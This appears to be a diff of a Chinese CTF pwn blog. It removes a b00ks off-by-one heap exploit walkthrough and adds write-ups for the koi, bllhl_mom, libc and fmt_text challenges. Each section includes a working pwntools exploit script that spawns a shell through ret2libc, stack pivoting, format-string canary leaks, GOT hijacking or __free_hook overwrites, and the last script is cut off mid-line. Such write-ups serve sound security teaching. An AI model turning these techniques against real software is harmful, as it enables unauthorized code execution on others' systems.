-<p>并且，由于author和存放图书结构体的地址是挨着的，当我们print作者名的时候，由于没有\x00截断，也会把图书结构体地址泄露出来<br><img src="/./images/p7/image-44.png"><br><img src="/./images/p7/image-45.png"><br>通过下面的脚本泄露book1_addr</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br><span class="line">create(10,b&#x27;AAAA&#x27;,10,b&#x27;aaaa&#x27;)</span><br><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;haaa&#x27;)</span><br><span class="line">book1_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book1 addr(real_book1_id):&quot; + hex(book1_addr))</span><br></pre></td></tr></table></figure>
+<h1 id="koi"><a href="#koi" class="headerlink" title="koi"></a>koi</h1><p>知识点：</p>
+<ul>
+<li>ret2read</li>
+<li>ret2libc</li>
+</ul>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec看一下，64位小端，只开了NX保护：</p>
+<p><img src="/image.png"></p>
+<p>IDA中打开</p>
+<p><img src="/image-2.png"></p>
+<p>switch()只会进行一次，所以不用想肯定是利用存在栈溢出的这个wrshell()函数，注意wrshell()中read只能溢出一个字长，也就是只能覆盖rbp。</p>
+<p>看到if判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( v4 == 520 &amp;&amp; n == 520 )</span><br><span class="line"> &#123;</span><br><span class="line">   puts(&quot;GOOD&quot;);</span><br><span class="line">   xxx();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>我们要进入这个xxx()函数，得满足<code>v4 == 520 &amp;&amp; n == 520</code>这个条件，v4是我们输入的，我们需要再修改n的值为520，由于只有一次scanf的机会，所以想到在scanf的时候，同时给v4和n读入520。<br>观察scanf前的处理</p>
+<p><img src="/image-6.png"></p>
+<p>var_4是<code>地址-4</code>，<code>call scanf</code>前将rbp-4的地址赋给rax，作为scanf拟写入的参数，而rbp是我们可以随意覆盖的。<br>由于我们想要修改的变量n的地址在<code>0x60108C</code>，所以将rbp覆盖为<code>0x60108C+4</code>。</p>
+<p><img src="/image-3.png"></p>
+<p>这样一来scanf读入v4的值的同时，n也会写入同样的值。<br><em>这种攻击手法称为栈迁移中return2read攻击</em></p>
+<p>接着顺利进入<code>xxx()</code>：</p>
+<p><img src="/image-7.png"></p>
+<p>有0x100的溢出空间，常规泄露地址打ret2libc即可。</p>
+<p>这里泄露puts和read的地址，在<span class="exturl" data-url="aHR0cHM6Ly9saWJjLmJsdWthdC5tZS8=">https://libc.blukat.me/<i class="fa fa-external-link-alt"></i></span>找到对应的libc直接打就行</p>
+<p><img src="/image-8.png"></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./koi&quot;)</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;)</span><br><span class="line">n_addr = 0x60108c</span><br><span class="line">xxx_addr = 0x4009CE</span><br><span class="line">rdi = 0x400a63</span><br><span class="line">ret = 0x4005d9</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">payload = cyclic(0x50) + p64(n_addr + 0x4)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;520&#x27;)</span><br><span class="line"></span><br><span class="line"># 泄露puts</span><br><span class="line">io.recv() </span><br><span class="line">elf = ELF(&#x27;./koi&#x27;)</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload = cyclic(0x50+8) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(xxx_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">#puts_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line"># 泄露read</span><br><span class="line">io.recv()</span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">payload = cyclic(0x50+8) +p64(rdi) + p64(read_got) + p64(puts_plt) + p64(xxx_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - 0x80e50</span><br><span class="line">system_addr = libc_base + 0x50d70</span><br><span class="line">binsh_addr = libc_base + 0x1d8678</span><br><span class="line">payload = cyclic(0x50+8) + p64(rdi) + p64(binsh_addr) + p64(ret) +  p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 
-<p>根据前面的分析，如果我们向作者名输入32个字符，会溢出\x00,然后覆盖黄框中的地位\x60为\x00<br><img src="/./images/p7/image-26.png"></p>
-<p>验证一下，回到程序中，重新输入32个字节的作者名<br><img src="/./images/p7/image-28.png"><br>再查看内存，确实地位被覆盖为了\x00<br><img src="/./images/p7/image-29.png"><br>此时，程序会认为0x0000555555607400是book1结构体的地址（也是book1_id）<br><img src="/./images/p7/image-31.png"><br>而此时，这里什么都没有，显然这里是存在漏洞的，那该怎么利用呢？<br><strong>多试几次我们会发现，根据我们输入的name_size和desc_size的不同，图书结构体的地址会发生变化</strong><br>当name_size&#x3D;64，desc_size&#x3D;32时<br><img src="/./images/p7/image-33.png"><br>当name_size&#x3D;256，desc_size&#x3D;32时<br><img src="/./images/p7/image-34.png"></p>
-<h2 id="3-fake-book的故事"><a href="#3-fake-book的故事" class="headerlink" title="3.fake_book的故事"></a>3.fake_book的故事</h2><p>如果我们进行适当的调整，让book1_desc的地址的低位是\x00，比如在我当前环境下name_size&#x3D;208，desc_size&#x3D;32时内存是这样的<br><img src="/./images/p7/image-36.png"><br>此时book1_desc在0x0000555555607500这个地址，我们可以通过edit功能修改这里的内容</p>
-<p>为什么要这样做呢？想想off_by_one漏洞的利用，我们说过我们可以通过change_author，输入32个字节让他溢出<br><img src="/./images/p7/image-37.png"><br>导致上图中红色框框的地址低位变为\x00<br><img src="/./images/p7/image-38.png"><br>现在再来看看是什么情况?现在程序认为黄色标注的才是他的book1<br><img src="/./images/p7/image-39.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x555555607500 = book1_id</span><br><span class="line">0x555555607508 = book1_name</span><br><span class="line">0x555555607510 = book1_desc</span><br><span class="line">0x555555607518 = book1_desc_size</span><br></pre></td></tr></table></figure>
-<p>而在没有被纂改前，这段区域其实是book1_desc的内容，感受到不对劲了吗？<br><strong>这段区域我们是可以预先用edit功能布置的</strong>。重新再来一遍，回到溢出前的状态<br><img src="/./images/p7/image-42.png"><br>c回车，选择edit，修改图书内容<br><img src="/./images/p7/image-41.png"><br>回来看看book1_desc的内容<br><img src="/./images/p7/image-43.png"><br>这段6666在我们利用off_by_one漏洞溢出作者名后，会成为fake_book1_id和fake_book1_name<br><strong>明确一下，fake_book1_id和fake_book1_name的内容我们可以通过edit自定义</strong></p>
-<p>这有什么用呢？我们的思路是先拿到libc基地址，通过libc基地址去计算__free_hook真实地址，在伪造的图书结构体中部署__free_hook钩子，然后free一个指向one_gadget的地址，触发execve(’&#x2F;bin&#x2F;sh’)拿到shell。那么我们先得拿到libc_base。</p>
-<h2 id="4-泄露libc基地址"><a href="#4-泄露libc基地址" class="headerlink" title="4.泄露libc基地址"></a>4.泄露libc基地址</h2><p><strong>当malloc一个接近或超过top_chunk的大小的空间时，程序会使用mmap拓展空间，使得堆以mmap的形式进行扩展。而mmap开辟出的空间与libc基址的偏移是固定的，因此只要拿到mmap开辟出的chunk的地址，就能计算出libc的基地址。</strong><br>看一下top_chunk大小<br><img src="/./images/p7/image-46.png"><br>所以，我们申请一个大于0x20b81的空间，使程序使用mmap拓展空间，这就是book2的申请</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create(0x21000,b&#x27;BBBB&#x27;,0x21000,b&#x27;bbbb&#x27;)</span><br></pre></td></tr></table></figure>
-<p>此时，我们画一下图书在内存中的布局<br><img src="/./images/p7/image-50.png"><br>我们想要得到libc的基地址，可以通过泄露以mmap拓展的这个book2的地址，怎么泄露呢？我们知道当调用Print的时候，程序会打印出来一些信息。<strong>既然想打印出来book2的地址，那么就可以将fake_book1_name指针指向book2_name的地址。Print在打印book1_name的时候，就会找到book2_name，把指针值（因为book2是以mmap拓展，所以book2的指针指向的地址都是0x7fff开头的）打印出来</strong>，看下图<br><img src="/./images/p7/image-51.png"><br>所以只需要将fake_book1_name指向 **0x555555608168 (&#x3D;book1_addr + 0x38,book1_addr是最初我们泄露的地址，也是real_book1_id)**，这样就可以泄露出这个0x7fff开头的地址，从而得到libc<br>用edit布置我们的fake_book1_id为1；fake_book1_name为book1_addr + 0x38</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(1) + p64(book1_addr + 0x38)</span><br><span class="line">edit(1,payload)</span><br></pre></td></tr></table></figure>
-<p><img src="/./images/p7/image-53.png"><br>再利用off by one 漏洞（change作者名），将图书1结构体指针的低位覆盖为\x00，这样fake_book就生效了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">change(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br></pre></td></tr></table></figure>
-<p><img src="/Snipaste_2025-02-15_00-09-32.png"><br>那么此时打印Book1的信息，就可以泄露出“0x7ffff7fd4010”这个地址了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;Name: &#x27;)</span><br><span class="line">book2_name_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book2 name addr:&quot; + hex(book2_name_addr))</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>
-<p><img src="/./images/p7/image-54.png"><br>前面说过，book2_name的地址，相对libc基地址的偏移是固定的，通过vmmap看到可读可执行的libc.so的起始地址是0x7ffff7800000<br><img src="/./images/p7/image-55.png"><br>我们得到的book2_name_addr的地址是0x7ffff7fd4010，那么</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># book2_name_addr - libc_base = 0x7ffff7fd4010 - 0x7ffff7800000 = 0x7D4010</span><br><span class="line"># 也就是</span><br><span class="line"># libc_base = book2_name_addr - 0x7D4010</span><br></pre></td></tr></table></figure>
-
-<h2 id="5-钩子和one-gadget"><a href="#5-钩子和one-gadget" class="headerlink" title="5.钩子和one_gadget"></a>5.钩子和one_gadget</h2><p>当delete一个book的时候，程序会调用free，所以我们用__free_hook去钩one_gadget<br>先计算__free_hook的地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free_hook = libc_base + libc.symbols[&quot;__free_hook&quot;]</span><br></pre></td></tr></table></figure>
-<p>至于one_gadget，因为我们已经泄露libc了，所以One_gadget可以直接在libc.so里面找，然后算上偏移就可以了<br><img src="/./images/p7/image-56.png"><br>看到三个gadget：0x4527a、0xf03a4、0xf1247（不同ubuntu版本得到的不一样，我的版本下第一个可以成功）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = libc_base + 0x4527a        #0x4527a    0xf03a4    0xf1247</span><br></pre></td></tr></table></figure>
+<h1 id="bllhl-mom"><a href="#bllhl-mom" class="headerlink" title="bllhl_mom"></a>bllhl_mom</h1><p>知识点：</p>
+<ul>
+<li>格式化字符串漏洞泄露canary</li>
+<li>栈迁移</li>
+</ul>
+<h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>首先checksec看一下<br><img src="/image-9.png"><br>32位小端，开启了canary和NX保护.</p>
+<p>IDA中看到，漏洞函数mom()确实存在canary，并且这个canary位于<code>ebp-0xc</code>的位置</p>
+<p><img src="/image-11.png"></p>
+<p>mom()中有三次read，均存在漏洞:</p>
+<p><img src="/image-10.png"></p>
+<p>第一个read只能输5字节，存在格式化字符串漏洞，可以泄露栈上信息，那么就用他来泄露canary，调试中算一下偏移是<code>%23$p</code>;</p>
+<p><img src="/image-12.png"></p>
+<p>第二个和第三个read均可以溢出2个字长，因为溢出字节很少，只能栈迁移到栈上.<br>那么第二个read就是用来泄露ebp的值，第三个read用来栈迁移。</p>
+<blockquote>
+<p>跟<code>ciscn_2019_es_2</code>这道题有点像，感兴趣可以去读我的这篇文章<a href="https://kubansec.github.io/posts/6e43/?highlight=%E6%A0%88%E8%BF%81%E7%A7%BB">栈迁移学习总结</a></p>
+</blockquote>
+<p>因为程序中有system，但没有<code>/bin/sh</code>，所以需要在栈中部署<code>/bin/sh</code>，最终布置的栈结构和栈帧的变化如图所示：</p>
+<p><img src="/image-13.png"></p>
+<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./bllhl_mom&#x27;)</span><br><span class="line">elf = ELF(&#x27;./bllhl_mom&#x27;)</span><br><span class="line"></span><br><span class="line"># 第一次read</span><br><span class="line">io.recv()</span><br><span class="line">io.send(b&#x27;%23$p&#x27;)</span><br><span class="line">canary = int(io.recv(10),16)</span><br><span class="line">print(hex(canary))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line"># 第二次read</span><br><span class="line">io.send(cyclic(0x50))</span><br><span class="line">io.recvuntil(b&#x27;taaa&#x27;)</span><br><span class="line">ebp = u32(io.recv(4))</span><br><span class="line">print(hex(ebp))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line"># 第三次read</span><br><span class="line">leave_ret = 0x0804861f</span><br><span class="line">system_addr = 0x08048490</span><br><span class="line">binsh_addr = ebp - 0x50</span><br><span class="line">canary_addr = ebp - 0xc</span><br><span class="line">payload = b&#x27;AAAA&#x27; + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr) + b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload = payload.ljust(0x44,b&#x27;\x00&#x27;)</span><br><span class="line">payload += p32(canary)</span><br><span class="line">payload = payload.ljust(0x50,b&#x27;\x00&#x27;)</span><br><span class="line">payload += p32(ebp-0x60) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 
-<h2 id="6-改善《4-泄露libc基地址》的payload"><a href="#6-改善《4-泄露libc基地址》的payload" class="headerlink" title="6.改善《4.泄露libc基地址》的payload"></a>6.改善《4.泄露libc基地址》的payload</h2><p>我们先想一想，接下来挂钩子明显还是要用到fake_book1结构体，但是不能像之前那要edit(1,xxx)布置了，<strong>因为book1结构体指针已经指向了fake_book1，如果直接edit(1,xxx)会修改fake_book1_desc指针指向的内容，而此时我们意识到我们的fake_book1_desc指针是空的！</strong><br>还记得当时我们当时布置fake_book1是怎么样布置的吗？</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(1) + p64(book1_addr + 0x38)</span><br><span class="line">edit(1,payload)</span><br></pre></td></tr></table></figure>
-<p><img src="/./images/p7/image-57.png"><br>稍微改善一下那时候的payload，把fake_book1_desc这片空白的空间也利用起来：fake_book1_name指向了book2_name，让fake_book1_desc也指向book2_desc</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)     # 0xffff作用内存地址的结束符</span><br><span class="line"># book2_desc和book2_name地址相差8个字节</span><br><span class="line">edit(1,payload)</span><br></pre></td></tr></table></figure>
-<p>此时内存是这样的<br><img src="/./images/p7/image-58.png"></p>
-<h2 id="7-挂钩子"><a href="#7-挂钩子" class="headerlink" title="7.挂钩子"></a>7.挂钩子</h2><p>改善之后，<strong>调用edit(1,xxx)，程序会直接去修改book2_desc指针为xxx，所以我们通过edit(1,free_hook)把钩子放在book2_desc，再通过edit(2,one_gadget),把one_gadget挂在钩子上，调用delete执行free，GET SHELL!</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit(1,p64(free_hook))</span><br><span class="line">edit(2,p64(one_gadget))</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h1><p>知识点：</p>
+<ul>
+<li>ret2libc</li>
+</ul>
+<h2 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec看一下，32位程序，只开了NX保护<br><img src="/image-14.png"></p>
+<p>IDA 里面看到是一个非常简单的栈溢出<br><img src="/image-15.png"></p>
+<p>那么直接泄露地址，打ret2libc就可以了。可以多泄露几个函数，交叉查询就不用一个一个去尝试了</p>
+<p>在<span class="exturl" data-url="aHR0cHM6Ly9saWJjLmJsdWthdC5tZS8=">https://libc.blukat.me/<i class="fa fa-external-link-alt"></i></span>找到libc<br><img src="/image-18.png"></p>
+<h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./libc&#x27;)</span><br><span class="line">elf = ELF(&#x27;libc&#x27;)</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">jiu_addr = 0x08048561</span><br><span class="line"></span><br><span class="line">payload = cyclic(58+4) + p32(puts_plt) + p32(jiu_addr) + p32(puts_got)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(b&#x27;like\n&#x27;)</span><br><span class="line">puts_addr = u32(io.recv(4))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">payload = cyclic(58+4) + p32(puts_plt) + p32(jiu_addr) + p32(read_got)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(b&#x27;like\n&#x27;)</span><br><span class="line">read_addr = u32(io.recv(4))</span><br><span class="line">print(hex(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - 0x0732a0</span><br><span class="line">sys_addr = libc_base +  0x048170</span><br><span class="line">binsh_addr = libc_base + 0x1bd0d5</span><br><span class="line">payload = cyclic(58+4) + p32(sys_addr) + p32(0xdeadbeef) + p32(binsh_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">libc = ELF(&quot;/home/kuban/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)</span><br><span class="line">io = process(&#x27;./b00ks&#x27;)</span><br><span class="line"></span><br><span class="line">def debug():	</span><br><span class="line">	gdb.attach(io)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line">def create(name_size , name , des_size , des):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;size: &#x27;,str(name_size))</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,name)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,str(des_size))</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,des)</span><br><span class="line"></span><br><span class="line">def delete(book_id):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,str(id))</span><br><span class="line"></span><br><span class="line">def edit(book_id,des):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,str(book_id))</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,des)</span><br><span class="line"></span><br><span class="line">def Print():</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br><span class="line"></span><br><span class="line">def change(author):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;5&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,author)</span><br><span class="line"></span><br><span class="line">io.sendline(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br><span class="line">create(208,b&#x27;AAAA&#x27;,32,b&#x27;aaaa&#x27;)</span><br><span class="line">create(0x21000,b&#x27;BBBB&#x27;,0x21000,b&#x27;bbbb&#x27;)</span><br><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;haaa&#x27;)</span><br><span class="line">book1_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book1 addr(real_book1_id):&quot; + hex(book1_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)</span><br><span class="line">edit(1,payload)</span><br><span class="line">change(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;Name: &#x27;)</span><br><span class="line">book2_name_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book2 name addr:&quot; + hex(book2_name_addr))</span><br><span class="line">libc_base = book2_name_addr - 0x7d4010</span><br><span class="line">free_hook = libc_base + libc.symbols[&quot;__free_hook&quot;]</span><br><span class="line">one_gadget = libc_base + 0x4527a        #0x4527a    0xf03a4    0xf1247</span><br><span class="line">log.success(hex(free_hook))</span><br><span class="line"></span><br><span class="line">edit(1,p64(free_hook))</span><br><span class="line">edit(2,p64(one_gadget))</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
+<h1 id="fmt-text"><a href="#fmt-text" class="headerlink" title="fmt_text"></a>fmt_text</h1><p>知识点：</p>
+<ul>
+<li>格式化字符串漏洞</li>
+<li>劫持got表</li>
+</ul>
+<h2 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec，32位，开启canary和NX保护，<code>RELRO:      Partial RELRO</code>代表got表可写<br><img src="/image-20.png"></p>
+<p>IDA里面分析：</p>
+<p><img src="/image-21.png"></p>
+<p>yichu函数存在两次格式化字符串漏洞</p>
+<p>测一下偏移，偏移为6：</p>
+<p><img src="/image-23.png"></p>
+<p>并且存在system函数:<br><img src="/image-22.png"></p>
+<p>那么思路就是利用第一次格式化字符串漏洞将printf的got表指针指向system函数，第二次发送<code>/bin/sh</code>构造<code>printf(&#39;/bin/sh&#39;)</code>，程序就会执行<code>system(&#39;/bin/sh&#39;)</code>了</p>
+<h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./fmt_text&#x27;)</span><br><span class="line">elf = ELF(&#x27;fmt_text&#x27;)</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">system_plt = elf.plt[&#x27;system&#x27;]</span><br><span class="line">payload = fmtstr_payload(6,&#123;printf_got:system_plt&#125;) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span 